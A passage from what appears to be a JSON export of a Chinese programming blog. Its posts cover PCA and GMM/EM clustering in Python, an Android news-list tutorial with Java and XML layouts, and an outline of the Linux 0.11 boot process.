15:51:25 2016@author: kuangmeng\"\"\"import numpy as npimport matplotlib.pyplot as plt#全局变量定义区XLabel = list()YLabel = list()phi = [0., 0.]#自己定义的矩阵转换函数def Transport(matrix): temp = list() for i in range(len(matrix[0])): temp.append(list()) for j in range(len(matrix)): temp[i].append(matrix[j][i]) return temp#加载文件（可以通过更改文件名来加载不同的测试数据）data_set = open('testSet.txt', 'r')for line in data_set.readlines(): data_line = line.strip().split() tmpx = float(data_line[0]) tmpy = float(data_line[1]) phi[0] += tmpx phi[1] += tmpy XLabel.append(tmpx) YLabel.append(tmpy)phi[0] = phi[0]/100.0phi[1] = phi[1]/100.0data_set.close()#加载结束temp_x = list()for i in range(100): temp_x.append([XLabel[i]-phi[0], YLabel[i]-phi[1]])temp_x_ = Transport(temp_x)sigma = np.dot(temp_x_, temp_x)D,V= np.linalg.eig(sigma)for i in range(2): for j in range(2): V.real[i][j] *= -1temp_v_ = Transport(V.real)tr1 = list()tr1.append(XLabel)tr1.append(YLabel)tr1 = Transport(tr1)xr1 = np.dot(tr1, temp_v_[0])xr2 = np.dot(phi, temp_v_[1])xr = tr1# print xrfor i in range(len(XLabel)): xr[i][0] = np.dot(xr1[i], V.real[0][0])+np.dot(xr2, V.real[0][1]) xr[i][1] = np.dot(xr1[i], V.real[1][0])+np.dot(xr2, V.real[1][1])# print xrplt.plot(XLabel, YLabel, 'r+')temp_xr = Transport(xr)plt.plot(temp_xr[0], temp_xr[1], 'b*')for i in range(len(XLabel)): plt.plot([XLabel[i],xr[i][0]], [YLabel[i],xr[i][1]])plt.axis([-8,6,-5,5])plt.xlabel = 'x'plt.ylabel = 'y'plt.show() 本文链接： http://www.meng.uno/articles/6c0d033f/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"机器学习","slug":"AI/机器学习","permalink":"http://www.meng.uno/categories/AI/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://www.meng.uno/tags/机器学习/"}]},{"title":"使用EM算法优化的GMM","slug":"gmm","date":"2016-12-17T03:16:53.000Z","updated":"2018-02-17T02:10:30.701Z","comments":true,"path":"articles/177fbbcc/","link":"","permalink":"http://www.meng.uno/articles/177fbbcc/","excerpt":"先上代码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 1","text":"先上代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113 # -*- coding: utf-8 -*-import numpy as npimport matplotlib.pyplot as matimport matplotlib.mlab as mlab#EM算法def EM(dataSet,K): (N, M) = np.shape(dataSet) W = np.zeros([N, K]) P= N/K for k in range(K): W[np.floor(k*P):np.floor((k+1)*P), k] = 1 A,M,S = Mstep(dataSet,W) return W, A, M, S#M的跨度def Mstep(data,W): (N, M) = np.shape(data) K = np.size(W,1) Nk = np.sum(W,0) A = Nk/np.sum(Nk) Mm = data.T.dot(W).dot(np.diag(np.reciprocal(Nk))) S = np.zeros([M,M,K]) for k in range(K): datMean = data.T - Mm[0:,k][None].T.dot(np.ones([1,N])) S[:,:,k] = (datMean.dot(np.diag(W[0:,k])).dot(datMean.T))/Nk[k] return A,Mm,S#E的跨度def Estep(data,A,M,S): N = np.size(data,0) K = np.size(A) W = np.zeros([N,K]) for k in range(K): for i in range(N): W[i,k] = A[k]*multivariate(data[i,:][None].T, \\ M[:,k][None].T,S[:,:,k]) W = W*np.reciprocal(np.sum(W,1)[None].T) return Wdef multivariate(x, m, s): if len(x) == len(m) and (len(x), len(x)) == s.shape: det = np.linalg.det(s) const = 1.0/(np.math.pow((2*np.pi), float(len(x))/2) * np.math.pow(det, 1.0/2)) x_m = np.matrix(x - m) inv_ = np.linalg.inv(s) result = np.math.pow(np.math.e, -0.5 * (x_m.T * inv_ * x_m)) return const * result else: return -1#GMM主程序def GMM(): # 加载文件 input_file = open('points.dat') lines = input_file.readlines() Data = np.array([line.strip().split() for line in lines]).astype(np.float) (x, y) = np.shape(Data) mat.draw() mat.pause(0.01) mat.subplot(111) mat.plot(x, y, 'b*') learn = Data[np.math.ceil(x*0.8):x, 0:] train = Data[:np.math.floor(x*0.8), 0:] trainnum = 16 (W, Alpha, Mu, Sigma) = EM(train,trainnum) m = np.arange(-4.0, 4.0, 0.1) n = np.arange(-4.0, 4.0, 0.1) ax, ay = np.meshgrid(m, n) i = 0 prev = -9999 mat.clf() while(True): if(False): SigmaSum = np.sum(Sigma,2) for k in range(trainnum): Sigma[:,:,k] = SigmaSum W = Estep(train,Alpha,Mu,Sigma) Alpha,Mu,Sigma = Mstep(train,W) # trains = logLike(train,Alpha,Mu,Sigma) N,M = np.shape(train) P = np.zeros([N,len(Alpha)]) for k in range(len(Alpha)): for j in range(N): P[j,k] = multivariate(train[j,:][None].T,Mu[0:,k][None].T,Sigma[:,:,k]) trains = np.sum(np.log(P.dot(Alpha))) i = i + 1 #画图，训练和测试样本 mat.subplot(211) mat.scatter(train[0:,0],train[0:,1]) mat.hold(True) for k in range(0, trainnum): az = mlab.bivariate_normal(ax, ay, Sigma[0, 0, k], Sigma[1, \\ 1, k], Mu[0,k], Mu[1,k], Sigma[1, 0, k]) try: mat.contour(ax, ay, az) except: continue mat.hold(False) # Render these mat.draw() mat.pause(0.01) mat.subplot(212) mat.scatter(learn[0:,0],learn[0:,1]) mat.hold(True) for k in range(0, trainnum): az = mlab.bivariate_normal(ax, ay, Sigma[0, 0, k], Sigma[1, \\ 1, k], Mu[0,k], Mu[1,k], Sigma[1, 0, k]) try: mat.contour(ax, ay, az) except: continue mat.hold(False) if(i&gt;150 or abs(trains - prev)&lt; 0.01): break prev = trainsif __name__ == '__main__': GMM() 实验要求 实验目标 实现一个混合高斯模型，并且用EM算法估计模型中的参数。 实验过程 用混合高斯模型产生k个高斯分布的数据（其中参数自己设定），然后用你实现的EM算法估计参数，看看每次迭代后似然值变化情况，考察EM算法是否可以获得正确的结果（与你设定的结果比较）。 可以UCI上找一个简单问题数据，用你实现的GMM进行聚类。 算法原理 GMM算法 高斯模型就是用高斯概率密度函数（正态分布曲线）精确地量化事物，将一个事物分解为若干的基于高斯概率密度函数（正态分布曲线）形成的模型。 对图像背景建立高斯模型的原理及过程：图像灰度直方图反映的是图像中某个灰度值出现的频次，也可以认为是图像灰度概率密度的估计。如果图像所包含的目标区域和背景区域相比比较大，且背景区域和目标区域在灰度上有一定的差异，那么该图像的灰度直方图呈现双峰-谷形状，其中一个峰对应于目标，另一个峰对应于背景的中心灰度。对于复杂的图像，尤其是医学图像，一般是多峰的。通过将直方图的多峰特性看作是多个高斯分布的叠加，可以解决图像的分割问题。 在智能监控系统中，对于运动目标的检测是中心内容，而在运动目标检测提取中，背景目标对于目标的识别和跟踪至关重要。而建模正是背景目标提取的一个重要环节。 我们首先要提起背景和前景的概念，前景是指在假设背景为静止的情况下，任何有意义的运动物体即为前景。建模的基本思想是从当前帧中提取前景，其目的是使背景更接近当前视频帧的背景。即利用当前帧和视频序列中的当前背景帧进行加权平均来更新背景,但是由于光照突变以及其他外界环境的影响，一般的建模后的背景并非十分干净清晰，而高斯混合模型是是建模最为成功的方法之一。 混合高斯模型使用K（基本为3到5个）个高斯模型来表征图像中各个像素点的特征,在新一帧图像获得后更新混合高斯模型, 用当前图像中的每个像素点与混合高斯模型匹配,如果成功则判定该点为背景点, 否则为前景点。 通观整个高斯模型，主要是有方差和均值两个参数决定，对均值和方差的学习，采取不同的学习机制,将直接影响到模型的稳定性、精确性和收敛性 。由于我们是对运动目标的背景提取建模，因此需要对高斯模型中方差和均值两个参数实时更新。为提高模型的学习能力,改进方法对均值和方差的更新采用不同的学习率;为提高在繁忙的场景下,大而慢的运动目标的检测效果,引入权值均值的概念,建立背景图像并实时更新,然后结合权值、权值均值和背景图像对像素点进行前景和背景的分类。 具体实现过程： 为图像的每个像素点指定一个初始的均值、标准差以及权重。 收集N（一般取200以上，否则很难得到像样的结果）帧图像利用在线EM算法得到每个像 素点的均值、标准差以及权重。 从N+1帧开始检测，检测的方法： 对每个像素点： 将所有的高斯核按照 ω / σ 降序排序 选择满足下式的前M个高斯核：M = arg min(ω / σ &gt; T) 如果当前像素点的像素值在中有一个满足：就可以认为其为背景点。 更新背景图像，用EM算法。 EM算法 EM 算法是 Dempster，Laind，Rubin 于 1977 年提出的求参数极大似然估计的一种方法，它可以从非完整数据集中对参数进行 MLE 估计，是一种非常简单实用的学习算法。这种方法可以广泛地应用于处理缺损数据，截尾数据，带有噪声等所谓的不完全数据(incomplete data)。 最大期望算法经过两个步骤交替进行计算： 第一步是计算期望（E），利用对隐藏变量的现有估计值，计算其最大似然估计值； 第二步是最大化（M），最大化在 E 步上求得的最大似然值来计算参数的值。 M 步上找到的参数估计值被用于下一个 E 步计算中，这个过程不断交替进行。 通过交替使用这两个步骤，EM算法逐步改进模型的参数，使参数和训练样本的似然概率逐渐增大，最后终止于一个极大点。直观地理解EM算法，它也可被看作为一个逐次逼近算法：事先并不知道模型的参数，可以随机的选择一套参数或者事先粗略地给定某个初始参数λ0 ，确定出对应于这组参数的最可能的状态，计算每个训练样本的可能结果的概率，在当前的状态下再由样本对参数修正，重新估计参数λ，并在新的参数下重新确定模型的状态，这样，通过多次的迭代，循环直至某个收敛条件满足为止，就可以使得模型的参数逐渐逼近真实参数。 具体实现步骤： 给出种类数k,初始化每一类高斯分布的均值μk，方差∑k以及每一类的概率πk； 执行EM； 计算似然，如果没有达到预期效果，则返回第2步； 计算每个数据点对于k个高斯分布的似然，选择似然最大的一类作为数据的最终分类。 其他的混合模型，例如朴素贝叶斯混合模型也是可以使用EM算法推出使用的，这一算法虽然在GMM中作为参数使用，但是其仍然可以单独发挥作用。我觉得EM算法就是相互迭代（毕竟其由E和M两部分组成嘛），求出一个稳定值，而这种相互迭代的方法用的范围挺广的，例如混合模型，K-means等都需要使用。 与K-means的区别 在上文我也已经提到了EM算法可以用在K-means等其他需要迭代的方法上的事实，其实，我觉得GMM 和 K-means 很像，只不过后者要简单，而且相对来说实现并不是很高效。不过 GMM 是学习出一些概率密度函数来（所以 GMM 除了用在 clustering 上之外，还经常被用于 density estimation ），简单地说，K-means 的结果是每个数据点被 assign 到其中某一个 cluster 了，而 GMM 则给出这些数据点被 assign 到每个 cluster 的概率，又称作 soft assignment。 实验环境 Spyder 作为Python开发的集成开发环境； 编程语言：Python 3.5； 操作系统：macOS Sierra。 小结 GMM算法作为EM算法族的一个例子，它指定了各个参与杂合的分布都是高斯分布，即分布参数表现为均值Mu和方差Sigma。通过EM算法作为计算使用的框架，迭代地算出各个高斯分布的参数。 GMM与K-means的思考 提到GMM不得不提K-means，总结了网上的资料以及老师上课的课件，我将两者的区别与联系陈述如下： 两者的联系: 都是迭代执行的算法，且迭代的策略也相同：算法开始执行时先对需要计算的参数赋初值，然后交替执行两个步骤，一个步骤是对数据的估计（k-means是估计每个点所属簇；GMM是计算隐含变量的期望）；第二步是用上一步算出的估计值重新计算参数值，更新目标参数（k-means是计算簇心位置；GMM是计算各个高斯分布的中心位置和协方差矩阵） 两者的区别: 首先，两者需要计算的参数不同：K-means是簇心位置；GMM是各个高斯分布的参数；其次，两者计算目标参数的方法不同：K-means是计算当前簇中所有元素的位置的均值；GMM是基于概率的算法，是通过计算似然函数的最大值实现分布参数的求解的。 关于GMM引发的过拟合的思考 首先我想提到这样的一个“人辨认其他生物（例如鱼）”的例子。当我们被告知水里游的那个生物是鱼之后，我们会使用“在同样的地方生活的是同一种东西”这类似的假设，归纳出“在水里游的都是鱼”这样一个结论。当然这个过程是完全“本能”的，如果不仔细去想，我们也不会了解自己是怎样“认识鱼”的。另一个值得注意的地方是这样的假设并不总是完全正确的，甚至可以说总是会有这样那样的缺陷的，因为我们有可能会把虾、龟、甚至是潜水员当做鱼。也许你觉得可以通过修改前提假设来解决这个问题，例如，基于“生活在同样的地方并且穿着同样衣服的是同一种东西”这个假设，你得出结论：在水里有并且身上长有鳞片的是鱼。可是这样还是有问题，因为有些没有长鳞片的鱼现在又被你排除在外了。 机器在识别方面面临着和人一样的问题，在机器学习中，一个学习算法也会有一个前提假设，这里被称作“归纳偏执”。例如线性回归，目的是要找一个函数尽可能好地拟合给定的数据点，它的归纳偏执就是“满足要求的函数必须是线性函数”。一个没有归纳偏执的学习算法从某种意义上来说毫无用处，就像一个完全没有归纳能力的人一样，在第一次看到鱼的时候有人告诉他那是鱼，下次看到另一条鱼了，他并不知道那也是鱼，因为两条鱼总有一些地方不一样的，或者就算是同一条鱼，在河里不同的地方看到，或者只是看到的时间不一样，也会被他认为是不同的，因为他无法归纳，无法提取主要矛盾、忽略次要因素，只好要求所有的条件都完全一样──然而哲学家已经告诉过我们了：世界上不会有任何样东西是完全一样的，所以这个人即使是有无比强悍的记忆力，也绝学不到任何一点知识。 于是有了上面的铺垫，我们就可以引出论题——“过拟合 ”，就像前面的回归的问题，如果去掉“线性函数”这个归纳偏执，因为对于 N 个点，我们总是可以构造一个 N-1 次多项式函数，让它完美地穿过所有的这 N 个点，或者如果我用任何大于 N-1 次的多项式函数的话，我们甚至可以构造出无穷多个满足条件的函数出来。如果假定特定领域里的问题所给定的数据个数总是有个上限的话，我可以取一个足够大的 N ，从而得到一个（或者无穷多个）“超级函数”，能够拟合这个领域内所有的问题。 没有归纳偏执或者归纳偏执太宽泛会导致过拟合 ，然而另一个极端──限制过大的归纳偏执也是有问题的：如果数据本身并不是线性的，强行用线性函数去做回归通常并不能得到好结果（例如我在“实验一：多项式拟合曲线”中就做过相应的测试）。难点正在于在这之间寻找一个临界点。不过我们在这里相对于机器来说有一个很大的优势：人通常不会孤立地用某一个独立的系统和模型去处理问题，一个人每天都会从各个来源获取大量的信息，并且通过各种手段进行整合处理，归纳所得的所有知识最终得以统一地存储起来，并能有机地组合起来去解决特定的问题。 以上就是我关于“过拟合”的一点不全面的思考！ 本文链接： http://www.meng.uno/articles/177fbbcc/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"机器学习","slug":"AI/机器学习","permalink":"http://www.meng.uno/categories/AI/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://www.meng.uno/tags/机器学习/"}]},{"title":"Android新闻软件编写","slug":"androidnews","date":"2016-12-16T07:01:14.000Z","updated":"2018-02-09T10:46:20.938Z","comments":true,"path":"articles/8fb3f6d8/","link":"","permalink":"http://www.meng.uno/articles/8fb3f6d8/","excerpt":"当我开始学安卓开发时，我发现网上最多的教程就是关于Android上的新闻客户端开发的（而且课时特别长），我本人觉得完全是那些上传网课的人想拉时长牟利，在写完listview之后，因为我们的《软设》项目需要，我也来做做“新闻页”，我只写显示过程（不涉及爬虫），只是为了记录下开发过程供初学者及日后自己回顾。 首先，我在values/string目录加上如下条目，用作显示（内容无关）： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36","text":"当我开始学安卓开发时，我发现网上最多的教程就是关于Android上的新闻客户端开发的（而且课时特别长），我本人觉得完全是那些上传网课的人想拉时长牟利，在写完listview之后，因为我们的《软设》项目需要，我也来做做“新闻页”，我只写显示过程（不涉及爬虫），只是为了记录下开发过程供初学者及日后自己回顾。 首先，我在values/string目录加上如下条目，用作显示（内容无关）： 123456789101112131415161718192021222324252627282930313233343536 &lt;string name=\"title\"&gt;是上帝除四害是的次数不多是彻底那就是地产表示比不对是不死都今?&lt;/string&gt; &lt;string name=\"text\"&gt;我是测手术储备货币结算你说的内存金士顿内存就剧场那就看到手残你从从今年刷卡才能加内存显卡才能收到你今年的你朝鲜才能常出现从侠客行朝鲜&lt;/string&gt; &lt;string-array name=\"text_arr\"&gt; &lt;item&gt;bids比貂蝉死不打算比赛的buds不v电话苏帮你吧报错还加班猝死地产表示出版社u白崇禧必须&lt;/item&gt; &lt;item&gt;但是不撒手撒就行字数限制到6个字，多的用省略号，是设置什么属学校决定停止晚自习，我和同学一起回荚冬 我是在那次孝雅之星的事迹报告会上认识她的。当轮到她上场的时候，主持人这样说道：“她是一个外表刚强，内心柔弱的人。”话音刚落，她班上的同学一阵哄堂大笑。 我用疑惑的眼神看了看身旁的同学，她告诉我，在她们班上谁都知道她是一个标准的女汉子。她的话勾起了我的好奇心，使我有了想听听她的故事的欲望。 她步履坚定的走上了演讲台，先是向我们深深地鞠了一躬，便开始娓娓道来她的事迹。 她的父母都在外打拼，忙于事业，所以很少有空去照顾她，所以家中的一切只能由她一人包办。后来，她又有了一个妹妹，致使她身上的担子又加重了许多，但她依然十分 坚强的承担这一切。她说妹妹的到来对于她来说像一个天使一样美好，而并不是觉得她是一个负担。当我们回到家中扑在父母怀里撒娇时，她在床头哄着妹妹入睡；当我作文网 http://wwW.zuoWen8.Com/们安稳的进入梦乡时，她却还在奋笔疾书。夜的黑暗与漫长，只有她才知道；思念的感受有多浓稠，只有她才知道；内心的压抑有多难受，只有她才知 道。 当她说到妹妹因调皮将很烫的饭菜洒到她的手臂上，她还得继续给妹妹喂饭时，当她提及妹妹做坏事后她忍气吞声的到别人家中道歉时，她哽咽了，将头扭到一边独自抹眼泪。 我们沉默了，低头不语。忧伤的气息迅速在全场蔓延，每个人的心都在和她共鸣着，有好几次，她正准备开口时，却都卡在了喉咙，全场为她响起了雷鸣般经久不息的掌声。 &lt;/item&gt; &lt;item&gt;看到他我想到了爸爸，幸好他今天不上班，不用冒那么大的雪，假如哪个人是我爸爸，我多么希看有一个好心人上前伸出一只手，帮他一把。假如那是你，&lt;/item&gt; &lt;item&gt;我停了车子，想往帮助他，可我也象那些来来往往的行人一样，脚步并没有动，的确有很多人同情他，同情也的确对他没用，他还是站不起来，一遍一遍看他起来又摔倒，只好转过头， 不看他，疼痛无奈，一个中年男子的窘态在众人眼前暴露无遗，这时的他没有一点男子汉的心胸。&lt;/item&gt; &lt;item&gt;走到一个小岔路口时，我看到路的另一边一个中年男子坐在地上，他穿着青色衣服，双手扶地，似乎挣扎着坐起来，一次又一次尝试着。旁边躺着他的尽看的大梁自行车，等待着主人扶 起它，在这路上最难过的就是他们了吧！也只有他们可以相互安慰。&lt;/item&gt; &lt;item&gt;春天，春姑娘带来了蒙蒙细雨和柔和的春风，并把它们化作一只大画笔，把绿色涂在草坪上。这时，无数只小燕子从远方飞来，在草坪上飞来飞去。&lt;/item&gt; &lt;item&gt;夏天，草坪旁的花坛里，月季花欣然怒放，引来了勤劳的小蜜蜂和翩翩起舞的蝴蝶，热闹极了。&lt;/item&gt; &lt;item&gt;冬天，雪花落到草坪上，给草坪盖上了一层厚厚的棉被，来年，小草更加茁壮成长。&lt;/item&gt; &lt;item&gt;草坪就像一个氧气袋，它通过光合作用，净化空气，美化环境。我们要爱护学校的草坪。&lt;/item&gt; &lt;/string-array&gt; &lt;string-array name=\"title_arr\"&gt; &lt;item&gt;死地产表示出版社u白崇禧必须&lt;/item&gt; &lt;item&gt;停止晚自习，我和同学一起回荚冬&lt;/item&gt; &lt;item&gt;假如哪个人是我爸爸，我多么希看有一个好心人上前伸出一只手，帮他一把。假如那是你，&lt;/item&gt; &lt;item&gt;我停了的行人一样，脚步并没有动，的确有很多人同情他，同情也的确对他没用，他还是站不起来，一遍一遍看他起来又摔倒，只好转过头，他没有一点男子汉的心胸。&lt;/item&gt; &lt;item&gt;他穿着青色衣服，双手扶地，似乎挣扎着坐起来，一次又一次尝试着。旁边躺着他的尽看的大梁自行车，等待着主人扶&lt;/item&gt; &lt;item&gt;春天。&lt;/item&gt; &lt;item&gt;夏天极了。&lt;/item&gt; &lt;item&gt;冬天，雪花落到&lt;/item&gt; &lt;item&gt;草坪就像的草坪。&lt;/item&gt; &lt;/string-array&gt; 接着编写显示主界面： 123456789101112131415161718192021222324252627 public class MainActivity extends AppCompatActivity&#123; private ListView listview; //private ArrayAdapter&lt;String&gt;arr_adapter; private SimpleAdapter simp_Adapter; private List&lt;Map&lt;String,String&gt;&gt;datalist; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); listview = (ListView)findViewById(R.id.listview); datalist = new ArrayList&lt;Map&lt;String,String&gt;&gt;(); simp_Adapter = new SimpleAdapter(this,getData(),R.layout.item, new String[]&#123;\"title\",\"text\"&#125;,new int[]&#123;R.id.title,R.id.text&#125;); listview.setAdapter(simp_Adapter); &#125; private List&lt;Map&lt;String,String&gt;&gt; getData()&#123; String[] data_text = getResources().getStringArray(R.array.text_arr); String[] data_title = getResources().getStringArray(R.array.title_arr); for(int i=0;i&lt;data_text.length;i++)&#123; Map&lt;String,String&gt;map = new HashMap&lt;String,String&gt;(); map.put(\"title\",data_title[i]); map.put(\"text\",data_text[i]); datalist.add(map); &#125; return datalist; &#125;&#125; 其对应的activity_main.xml文件为： 12345678910111213141516171819 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/activity_main\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:paddingBottom=\"@dimen/activity_vertical_margin\" android:paddingTop=\"@dimen/activity_vertical_margin\" tools:context=\"com.example.lpf.test.MainActivity\"&gt; &lt;ListView android:id=\"@+id/listview\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentStart=\"true\" android:background=\"@color/bg\" android:divider=\"@color/item_item\" android:dividerHeight=\"10dp\"/&gt;&lt;/RelativeLayout&gt; 再然后，编写点击后的后台跳转逻辑： 1234567891011121314 public class ShowActivity extends AppCompatActivity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_show); Bundle bundle = getIntent().getExtras(); String title = bundle.getString(\"title\"); String text = bundle.getString(\"text\"); TextView title_view = (TextView) findViewById(R.id.title); title_view.setText(title); TextView text_view = (TextView) findViewById(R.id.text); text_view.setMovementMethod(ScrollingMovementMethod.getInstance()); text_view.setText(text); &#125;&#125; 对应的activity_show.xml文件如下： 123456789101112131415161718192021222324252627 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:paddingBottom=\"@dimen/activity_vertical_margin\" android:paddingLeft=\"@dimen/activity_horizontal_margin\" android:paddingRight=\"@dimen/activity_horizontal_margin\" android:paddingTop=\"@dimen/activity_vertical_margin\"&gt; &lt;TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:id=\"@+id/title\" android:text=\"@string/title\" android:textSize=\"22sp\" android:typeface=\"monospace\" android:background=\"@color/itembg\"/&gt; &lt;TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:id=\"@+id/text\" android:textSize=\"18sp\" android:textColor=\"@color/textbg\" android:typeface=\"normal\" android:scrollbars=\"vertical\" android:text=\"@string/text\"/&gt;&lt;/LinearLayout&gt; 最后就是负责点击跳转的任务的后台程序了： 1234567891011121314151617181920212223 public class TestActivity extends ListActivity &#123; String[] data = &#123;\"北京\",\"西安\",\"广州\",\"上海\"&#125;; ListView lstview; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); lstview = (ListView)findViewById(R.id.listview); lstview.setOnItemClickListener(new AdapterView.OnItemClickListener()&#123; @Override public void onItemClick(AdapterView&lt;?&gt; parent, View view, int position, long id) &#123; String s = data[position]; &#125; &#125;); ArrayAdapter&lt;String&gt; adapter = new ArrayAdapter&lt;String&gt;( this, R.layout.item, R.id.listview, data ); lstview.setAdapter(adapter); &#125;&#125; 附加一个item.xml用于接收显示： 1234567891011121314151617181920212223242526272829 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:paddingBottom=\"@dimen/activity_vertical_margin\" android:paddingLeft=\"@dimen/activity_horizontal_margin\" android:paddingRight=\"@dimen/activity_horizontal_margin\" android:paddingTop=\"@dimen/activity_vertical_margin\" android:background=\"@drawable/white_bg\"&gt; &lt;TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:id=\"@+id/title\" android:text=\"@string/title\" android:textSize=\"20sp\" android:typeface=\"monospace\" android:background=\"@color/itembg\"/&gt; &lt;TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:id=\"@+id/text\" android:textSize=\"15sp\" android:textColor=\"@color/textbg\" android:typeface=\"normal\" android:maxLines=\"3\" android:ellipsize=\"end\" android:text=\"@string/text\"/&gt;&lt;/LinearLayout&gt; 至此一个新闻客户端基本框架就已经编写完毕！ 本文链接： http://www.meng.uno/articles/8fb3f6d8/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"}]},{"title":"Linux 0.11启动引导","slug":"os","date":"2016-12-16T06:52:23.000Z","updated":"2018-02-09T10:46:20.931Z","comments":true,"path":"articles/6c138ff9/","link":"","permalink":"http://www.meng.uno/articles/6c138ff9/","excerpt":"Linux引导启动程序程序在boot目录下，有bootset.s, head.s和setup.s（编译后），其中： bootset.s 系统启动时首先是进入实模式，从地址0xffff0（这地址映射的rom-bios在内存的地址）处开始执行bios代码，然后执行系统检测（也就是自检过程）,然后初始化实模式的中断向量表(实模式中断向量在内存物理地址0处)。然后将启动设备的第一个扇区（512字节，也就是bootset.s编译完成的内容）内容读取到内存0x7c00(31kB)处，并且跳转到这里。 跳转到bootset.s后，bootset.s主要做如下工作： bootset.s在最前面的几句代码先将","text":"Linux引导启动程序程序在boot目录下，有bootset.s, head.s和setup.s（编译后），其中： bootset.s 系统启动时首先是进入实模式，从地址0xffff0（这地址映射的rom-bios在内存的地址）处开始执行bios代码，然后执行系统检测（也就是自检过程）,然后初始化实模式的中断向量表(实模式中断向量在内存物理地址0处)。然后将启动设备的第一个扇区（512字节，也就是bootset.s编译完成的内容）内容读取到内存0x7c00(31kB)处，并且跳转到这里。 跳转到bootset.s后，bootset.s主要做如下工作： bootset.s在最前面的几句代码先将自己移动到内存0x90000（576kB）处； bootset.s将启动设备第2个扇区到第五个扇区内容（4个扇区里面存放的是setup.s的内容）读取到内存0x90200处，也就是bootset.s后面； 将内核其他模块读取到0x10000（64KB）处，读取的大小为192KB，对于当时的内核来说确实是足够大了； 在bootset.s偏移508处定义了根文件系统的设备号，并且根据编译选项进行了赋值操代码默认启动驱动器是软盘a，然后就是bootset.s,setup.s,和内核镜像都成放在软盘a中; setup.s 将系统的一些参数存放在0x90000处,覆盖之前的bootset.s,参数主要包括，内存大小，硬盘参数，显存的参数信息以及根文件系统的设备号; 定义了GDT表，最后加载了gdtr和ldtr，最后跳到保护模式GDT表定义在setup.s,也就是在0x90200的那段内存中，LDT还没有定义。 head.s 其被编译到内核镜像中。重新定义了GDT表(目前就一个第二个段描述符有效)和并定义LDT表（表中中断处理程序目前还是指向一个默认的处理程序），并加载相应的寄存器； 内存开始处设置页目录表，一共有4个叶目录，初始化页目录，然后开启分页，最后跳到主函数main()。 至此，系统启动引导完成。 本文链接： http://www.meng.uno/articles/6c138ff9/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/tags/操作系统/"}]},{"title":"Android的ListView的使用","slug":"android_listview","date":"2016-12-15T05:58:11.000Z","updated":"2018-02-09T10:46:20.916Z","comments":true,"path":"articles/5d6c9819/","link":"","permalink":"http://www.meng.uno/articles/5d6c9819/","excerpt":"可能我们在手机APP上使用的最多的视图就是列表了，那么Android列表（ListView）该怎么使用呢？ 首先还是显示界面activity_main.xml: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19","text":"可能我们在手机APP上使用的最多的视图就是列表了，那么Android列表（ListView）该怎么使用呢？ 首先还是显示界面activity_main.xml: 12345678910111213141516171819 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:id=\"@+id/activity_main\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:paddingBottom=\"@dimen/activity_vertical_margin\" android:paddingTop=\"@dimen/activity_vertical_margin\" tools:context=\"com.example.lpf.test.MainActivity\"&gt; &lt;ListView android:id=\"@+id/listview\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentStart=\"true\" android:background=\"@color/bg\" android:divider=\"@color/item_item\" android:dividerHeight=\"10dp\"/&gt;&lt;/RelativeLayout&gt; 之后是其对应的MainActivity.java文件： 123456789101112131415161718192021222324252627 public class MainActivity extends AppCompatActivity&#123; private ListView listview; //private ArrayAdapter&lt;String&gt;arr_adapter; private SimpleAdapter simp_Adapter; private List&lt;Map&lt;String,String&gt;&gt;datalist; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); 